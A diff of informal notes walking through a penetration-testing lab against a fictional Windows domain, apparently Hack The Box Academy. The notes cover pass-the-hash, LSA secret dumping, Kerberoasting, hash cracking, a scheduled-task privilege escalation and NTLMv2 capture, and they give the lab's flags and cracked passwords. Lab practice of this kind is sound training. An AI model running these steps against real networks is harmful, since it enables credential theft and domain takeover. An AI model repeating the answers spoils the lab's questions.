@@ -46,6 +46,35 @@ WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
 
 hporter:Gr8hambino!      <--- still need  to figure out how to confirm this. 
 
+try this in a sudo shell plz -> proxychains crackmapexec smb 172.16.8.20 -u administrator -H 0e20798f695ab0d04bc138b22344cea8 --local-auth
+
+
+LO FUCKING L -> 
+
+root@htb-5jg0imiswb]─[/home/htb-ac-1235531/Desktop]
+└──╼ #proxychains crackmapexec smb 172.16.8.20 -u administrator -H 0e20798f695ab0d04bc138b22344cea8 --local-auth --lsa
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.20:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.20:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.20:135  ...  OK
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.20:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.8.20:445  ...  OK
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] Dumping LSA secrets
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45+00:00)
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes256-cts-hmac-sha1-96:ed980404df4795e6d4a19d16d86d5cb546f637d8c7cc4a3aa2e1a839f9fe3d8f
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes128-cts-hmac-sha1-96:ff843ce0185edc175f2bdc4f1490c50a
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:des-cbc-md5:8f106102751a7a0d
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:plain_password_hex:3e002600200046005a003000460021004b00460071002e002b004d0042005000480045002e006c00280078007900580044003b0050006100790033006e002a0047004100590020006e002d00390059003b0035003e0077005d005f004b004900400051004e0062005700440074006b005e0075004000490061005d006000610063002400660033003c0061002b0060003900330060006a00620056006e003e00210076004a002100340049003b00210024005d004d006700210051004b002e004f007200290027004c00720030005600760027004f0055003b005500640061004a006900750032006800540033006c00
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aad3b435b51404eeaad3b435b51404ee:cb8a6327fc3dad4ea7c84b88c7542e7c:::
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\hporter:Gr8hambino!
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
+dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] Dumped 9 LSA secrets to /root/.nxc/logs/ACADEMY-AEN-DEV_172.16.8.20_2025-03-25_110347.secrets and /root/.nxc/logs/ACADEMY-AEN-DEV_172.16.8.20_2025-03-25_110347.cached
 
 
 now.... ill go ahead and re-do all our steps from previous room because they want to me to run sharphound from the printspoofer shell which i get so whatever. 
@@ -118,7 +147,7 @@ PORT     STATE SERVICE
 and two if we ran the static nmap again lol we'd figure it the fuck out : ] 
 
 so the syntax for the local portforwarding in order for us to xfreerdp into hporter would be -> 
-ssh -i rootkey -L 13389:172.16.8.20:3389 root@10.129.203.111
+ssh -i rootkey -L 13389:172.16.8.20:3389 root@10.129.114.147
 
 Breaking it Down Step by Step
 ssh -i rootkey → Use the rootkey private key for authentication (you already got this part).
@@ -467,27 +496,171 @@ mpalledorous::ACADEMY-AEN-DEV:5EB0B310E7B8BA04:<SNIP>
 
 So tomorrow we will come back and answer all these questions -> 
 
+before runnign we confirmed hte plaintext password with these steps -> 
+1. on HOST -> sudo su 
+2. proxychains crackmapexec smb 172.16.8.20 -u administrator -H 0e20798f695ab0d04bc138b22344cea8 --local-auth --lsa
+3. SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\hporter:Gr8hambino!
 
 
-1. Find a backup script that contains the password for the backupadm user. Submit this user's password as your answer.
+1. Find a backup script that contains the password for the backupadm user. Submit this user's password as your answer. - !qazXSW@ 
+1. ssh -i rootkey -L 13389:172.16.8.20:3389 root@10.129.114.147
+2. on HOST -> 
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe
+3. back onto HPORTER  cmd line -> 
+C:\Users\hporter>net use
+New connections will be remembered.
 
+
+Status       Local     Remote                    Network
+
+-------------------------------------------------------------------------------
+                       \\TSCLIENT\shared         Microsoft Terminal Services
+The command completed successfully.
+
+
+C:\Users\hporter>cd C:\share
+
+C:\Share>copy \\TSCLIENT\shared\PowerView.ps1
+        1 file(s) copied.
+C:\Share>copy \\TSCLIENT\shared\Snaffler.exe
+        1 file(s) copied.
+
+3.5 for shits n gigs and im sure we will need htis flag -> 
+PS C:\Share> dir
+
+
+    Directory: C:\Share
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         6/1/2022  11:42 AM                DNN
+-a----         7/6/2019  10:42 PM            360 BuildPackages.bat
+-a----         7/6/2019  10:42 PM           6193 CKEditorDefaultSettings.xml
+-a----         7/6/2019  10:42 PM           7658 CKToolbarButtons.xml
+-a----         7/6/2019  10:42 PM           6956 CKToolbarSets.xml
+-a----         5/9/2022  11:58 PM             32 flag.txt
+-a----        3/25/2025   9:32 AM         770279 PowerView.ps1
+-a----        8/14/2022   6:17 PM         479744 Snaffler.exe
+-a----         7/6/2019  10:42 PM           3292 WatchersNET.CKEditor.sln
+
+
+PS C:\Share> type flag.txt
+bf22a1d0acfca4af517e1417a80e92d1
+
+4. PS C:\Share> Import-Module .\PowerView.ps1
+PS C:\Share> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Pwned123' -AsPlainText -Force) -Verbose
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
+VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
+5. still in hporter PS prompt -> .\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data 
+6. [INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2025-03-25 16:46:16Z [Share] {Green}<\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$>(R) Remote Admin
+[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2025-03-25 16:46:16Z [Share] {Black}<\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$>()
+[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2025-03-25 16:46:16Z [Share] {Green}<\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$>(R) Default share
+[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2025-03-25 16:46:16Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users
+[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2025-03-25 16:46:16Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\NETLOGON>(R) Logon server share
+[INLANEFREIGHT\hporter@ACADEMY-AEN-DEV01] 2025-03-25 16:46:16Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\SYSVOL>(R) Logon server share
+
+7. so we see that \\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users should be accessible and lets explore. 
+8. on our HOST SUDO SU shell -> proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Pwned123 -M spider_plus --share 'Department Shares'
+9. from this output we see -> Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/172.16.8.3.json".
+10. cat /tmp/nxc_hosted/nxc_spider_plus/172.16.8.3.json
+{
+    "Department Shares": {
+        "IT/Private/Development/SQL Express Backup.ps1": {
+            "atime_epoch": "2022-06-01 13:34:16",
+            "ctime_epoch": "2022-06-01 13:34:16",
+            "mtime_epoch": "2022-06-01 13:35:16",
+            "size": "3.91 KB"
+        }
+    },
+    "NETLOGON": {
+        "adum.vbs": {
+            "atime_epoch": "2022-06-01 13:34:41",
+            "ctime_epoch": "2022-06-01 13:34:41",
+            "mtime_epoch": "2022-06-01 13:34:39",
+            "size": "32.15 KB"
+
+11. so in our SU SHELL on host -> proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' -> enter Pwned123 
+12. smb: \> cd IT\Private\Development
+13. smb: \IT\Private\Development\> get "SQL Express Backup.ps1"
+getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (88.8 KiloBytes/sec) (average 88.8 KiloBytes/sec)
+14. on host machine -> cat SQL Express Backup.ps1 -> 
+$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
+$mySrvConn.ServerInstance=$serverName
+$mySrvConn.LoginSecure = $false
+$mySrvConn.Login = "backupadm"
+$mySrvConn.Password = "!qazXSW@"
 
 
 
 2. Perform a Kerberoasting attack and retrieve TGS tickets for all accounts set as SPNs. Crack the TGS of the backupjob user and submit the cleartext password as your answer.
+* did have to look up the solution for this... * 
+1. proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS   <---- on Sudo SU shell 
+2. hashcat -O -w 3 -m 13100 SPNS /usr/share/wordlists/rockyou.txt -> first one cracked is backupjob:lucky7 
+
 
 
 
 
 3. Escalate privileges on the MS01 host and submit the contents of the flag.txt file on the Administrator Desktop.
+1. from our first question lets try to use these creds to log into 172.16.8.50 with evil-winrm on our SUDO SU shell -> backupadm:!qazXSW@
+2. proxychains evil-winrm -i 172.16.8.50 -u backupadm -> password !qazXSW@ 
+3. and we are in : ] 
+4. type c:\panther\unattended.xml  <- remember we found this when reviewing the section before hand. 
+    <Value>Sys26Admin</Value>
+                            <PlainText>true</PlainText>
+                        </Password>
+                        <Description />
+                        <DisplayName />
+                        <Group>User</Group>
+                        <Name>ilfserveradm</Name>
+5. new creds -> ilfserveradm:Sys26Admin 
+6. in SUDO SU SHELL -> proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin 
+7. jk not in sudo shell for xfree sorry
+8. so once in we have to escalate privs to admin since its denied when trying to go to C:\Users\Administrator\Desktop\flag.txt 
+9. again im not sure where we learned this or how we knew this software was on here??? so yeah... anyway. 
+10. right click on desktop -> new -> text document -> type this -> net localgroup administrators ilfserveradm /add -> * important* when saving make sure to drop down to 'all files' then save as pwn.bat IN THE /Documnets file of ilfserveradm 
+11.run sysaxschedscp.exe and click on Setup Scheduled/Triggered Tasks...:
+12. Add task (Triggered) ...:
+13, "Folder to Monitor" to be C:\Users\ilfserveradm\Documents\ and check Run task if a file is added to the monitor folder or subfolder(s):
+14. Run any other Program and choose C:\Users\ilfserveradm\Documents\pwn.bat
+15. uncheck Login as the following user to run task, then click Next and then Finish:
+16. create any file in C:\Users\ilfserveradm\Documents so that the task is triggered and the batch script is executed:
+17. to confirm open powershell and type -> net localgroup administrators 
+PS C:\Users\ilfserveradm> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+ilfserveradm
+INLANEFREIGHT\Domain Admins
+The command completed successfully.
+
+cool. 
+18. file explorer -> c:\users -> click administrator -> enter .\ilfserveradm:Sys26Admin 
+19. go to desktop -> flag.txt -> 
+33a9d46de4015e7b3b0ad592a9394720
+
+4. Obtain the NTLMv2 password hash for the mpalledorous user and crack it to reveal the cleartext value. Submit the user's password as your answer. - 1squints2 
+1. ON KALI: wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
+2. copy from KALI file system... actually right click -> copy -> RDP'd desktop -> right click -> paste 
+3. open powershell as admin with creds or -> .\ilfserveradm:Sys26Admin
+cd C:\Users\ilfserveradm\Desktop\
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
+
+[+] [2025-03-25T12:43:21] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20(ACADEMY-AEN-DEV):50791:
+mpalledorous::ACADEMY-AEN-DEV:1A247614C03E167F:2D19742E1692E4411DEA0DBA06EFC0E8:01010000000000004E598866AD9DDB01BBB81FA77C495B3F0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008004E598866AD9DDB01060004000200000008003000300000000000000000000000002000009C788F97A08097760CBEE3C2050758A72CC0CE1662339CFC5507C89C513069A10A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
+
+4. copy and paste and save ol mug to mpop file on KALI 
+mpalledorous::ACADEMY-AEN-DEV:1A247614C03E167F:2D19742E1692E4411DEA0DBA06EFC0E8:01010000000000004E598866AD9DDB01BBB81FA77C495B3F0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008004E598866AD9DDB01060004000200000008003000300000000000000000000000002000009C788F97A08097760CBEE3C2050758A72CC0CE1662339CFC5507C89C513069A10A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
 
 
-
-
-4. Obtain the NTLMv2 password hash for the mpalledorous user and crack it to reveal the cleartext value. Submit the user's password as your answer.
-
-
-
+5. hashcat -m 5600 -a 0 mpop /usr/share/wordlists/rockyou.txt -> 1squints2 
 
 
 
